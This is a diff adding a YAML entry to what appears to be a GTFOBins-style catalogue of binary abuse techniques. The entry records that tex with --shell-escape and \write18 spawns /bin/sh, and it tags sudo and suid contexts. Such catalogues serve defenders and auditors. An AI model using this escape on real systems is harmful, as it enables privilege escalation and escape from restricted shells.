@@ -1,0 +1,11 @@
+---
+functions:
+  shell:
+  - code: |-
+      tex --shell-escape '\immediate\write18{/bin/sh}'
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+...
